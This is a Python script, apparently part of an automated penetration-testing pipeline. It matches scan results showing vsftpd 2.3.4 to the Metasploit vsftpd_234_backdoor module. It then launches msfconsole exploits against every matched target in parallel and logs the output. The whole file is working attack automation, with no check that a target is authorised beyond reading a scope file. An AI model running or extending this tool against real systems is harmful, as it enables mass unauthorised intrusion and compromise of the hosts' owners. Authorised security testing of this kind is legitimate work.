import json
import subprocess
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

def search_exploits(scan_results, tools):
    exploits = {}
    for target, result in scan_results.items():
        if "vsftpd 2.3.4" in result:
            exploits[target] = "exploit/unix/ftp/vsftpd_234_backdoor"
        # Add more conditions to match different vulnerabilities to exploits
    return exploits

def run_msfconsole_script(target, exploit, tools):
    msf_commands = f"""
    use {exploit}
    set RHOST {target}
    exploit -j
    exit
    """
    try:
        process = subprocess.Popen(
            [tools['msfconsole'], "-q", "-x", msf_commands],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        stdout, stderr = process.communicate(timeout=300)

        logging.info(f"Exploitation output for {target}: {stdout}")
        if stderr:
            logging.error(f"Exploitation error for {target}: {stderr}")

    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        logging.error(f"Exploitation for {target} timed out. Output: {stdout}. Error: {stderr}")
    except Exception as e:
        logging.error(f"Error during exploitation for {target}: {e}")

def parallel_exploitation(exploits, tools):
    with ThreadPoolExecutor() as executor:
        futures = []
        for target, exploit in exploits.items():
            futures.append(executor.submit(run_msfconsole_script, target, exploit, tools))

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error during exploitation: {e}")

def run():
    logging.info("Exploitation started")
    with open('scope.json', 'r') as file:
        scope = json.load(file)

    with open('scan_results.json', 'r') as file:
        scan_results = json.load(file)

    exploits = search_exploits(scan_results, scope["tools"])

    parallel_exploitation(exploits, scope["tools"])

    logging.info("Exploitation completed")

if __name__ == "__main__":
    run()
